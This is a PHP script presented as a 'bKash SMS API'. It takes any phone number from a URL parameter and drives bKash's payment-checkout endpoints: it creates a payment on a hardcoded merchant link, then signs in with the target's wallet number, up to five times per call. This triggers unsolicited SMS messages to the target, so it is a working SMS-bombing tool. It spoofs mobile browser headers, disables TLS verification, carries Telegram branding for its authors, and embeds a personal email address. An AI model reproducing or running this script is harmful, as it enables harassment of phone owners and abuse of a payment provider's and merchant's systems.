<?php
/**
 * bKash SMS API
 */

header('Content-Type: application/json; charset=utf-8');
error_reporting(0);
ini_set('display_errors', 0);

$number = $_GET['number'] ?? $_GET['num'] ?? '';
$amount = $_GET['amount'] ?? '1'; // কতবার পাঠাতে চান (ডিফল্ট ১)

if (empty($number)) {
    echo json_encode([
        'status' => false,
        'message' => 'Please provide a valid phone number. Example: ?number=01700000000',
        'OWNER' => '@XrootCodeX',
        'TG' => 'https://t.me/CobraX_Empire',
        'DEVELOPER' => 'MehediSanix'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

// মোবাইল নম্বর স্যানিটাইজ করা
$number = preg_replace('/[^0-9]/', '', $number);
if (strlen($number) == 11 && substr($number, 0, 2) == '01') {
    // 017... Format
} elseif (strlen($number) == 13 && substr($number, 0, 4) == '8801') {
    $number = substr($number, 2);
}

$limit = min((int)$amount, 5); // সর্বোচ্চ ৫ বার পাঠাবে একসাথে সার্ভার সেফটির জন্য
$success_count = 0;

for ($i = 1; $i <= $limit; $i++) {
    
    $data_first = array(
        'intent' => 'sale',
        'basePath' => 'nazrul-mobile-shop01614849817',
        'urlFragment' => 'pay/bdt30/DkW1Sy',
        'trxType' => 'AMOUNT',
        'amount' => '30',
        'price' => '30',
        'references' => array(
            array(
                'fieldName' => 'Email',
                'fieldType' => 'EMAIL',
                'required' => false,
                'value' => 'armanhasansanto@gmail.com'
            )
        ),
        'sourceType' => 'payment-link',
        'useWalletAsContact' => true
    );

    $data_json_first = json_encode($data_first);

    $headers_first = array(
        'Host: cpp.bka.sh',
        'Content-Length: ' . strlen($data_json_first),
        'Content-Type: application/json',
        'Accept: application/json, text/plain, */*',
        'Origin: https://shop.bkash.com',
        'Referer: https://shop.bkash.com/',
        'User-Agent: Mozilla/5.0 (Linux; Android 13; 21121119SG Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.165 Mobile Safari/537.36',
        'X-Requested-With: mark.via.gp'
    );

    $ch_first = curl_init();
    curl_setopt($ch_first, CURLOPT_URL, 'https://cpp.bka.sh/customer-portal-middleware/create-payment');
    curl_setopt($ch_first, CURLOPT_POST, true);
    curl_setopt($ch_first, CURLOPT_POSTFIELDS, $data_json_first);
    curl_setopt($ch_first, CURLOPT_HTTPHEADER, $headers_first);
    curl_setopt($ch_first, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch_first, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch_first, CURLOPT_TIMEOUT, 10);
    $response_first = curl_exec($ch_first);
    curl_close($ch_first);

    if ($response_first) {
        $response_first_array = json_decode($response_first, true);
        if (isset($response_first_array['paymentID'])) {
            
            $data_second = array(
                'wallet' => $number,
                'paymentID' => $response_first_array['paymentID'],
                'apiVersion' => 'v1.2.0-beta'
            );

            $data_json_second = json_encode($data_second);

            $headers_second = array(
                'Host: checkoutbg.pay.bka.sh',
                'Content-Length: ' . strlen($data_json_second),
                'Accept: */*',
                'Content-Type: application/json',
                'User-Agent: Mozilla/5.0 (Linux; Android 13; 21121119SG Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.165 Mobile Safari/537.36',
                'Origin: https://client.pay.bka.sh',
                'Referer: https://client.pay.bka.sh/checkout/2'
            );

            $ch_second = curl_init();
            curl_setopt($ch_second, CURLOPT_URL, 'https://checkoutbg.pay.bka.sh/signInCheckout');
            curl_setopt($ch_second, CURLOPT_POST, true);
            curl_setopt($ch_second, CURLOPT_POSTFIELDS, $data_json_second);
            curl_setopt($ch_second, CURLOPT_HTTPHEADER, $headers_second);
            curl_setopt($ch_second, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch_second, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch_second, CURLOPT_TIMEOUT, 10);
            $response_second = curl_exec($ch_second);
            curl_close($ch_second);

            if ($response_second) {
                $success_count++;
            }
        }
    }
}

echo json_encode([
    'status' => ($success_count > 0),
    'message' => "Request processed successfully for {$number}",
    'sent_requests' => $success_count,
    'OWNER' => '@XrootCodeX',
    'TG' => 'https://t.me/CobraX_Empire',
    'DEVELOPER' => 'MehediSanix'
], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
?>
